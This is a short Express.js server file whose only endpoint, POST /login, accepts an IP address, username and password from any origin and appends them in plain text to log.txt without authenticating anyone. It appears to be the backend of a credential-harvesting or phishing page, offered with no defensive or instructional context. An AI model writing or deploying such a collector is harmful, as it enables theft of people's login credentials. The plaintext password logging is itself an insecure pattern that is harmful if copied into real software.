const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

app.post('/login', (req, res) => {
    const { ip, username, password } = req.body;
    if (ip && username && password) {
        const logEntry = `IP: ${ip}, Username: ${username}, Password: ${password}\n`;
        fs.appendFile('log.txt', logEntry, (err) => {
            if (err) {
                console.error('Error writing to file', err);
                res.sendStatus(500);
            } else {
                res.sendStatus(200);
            }
        });
    } else {
        res.sendStatus(400);
    }
});

app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
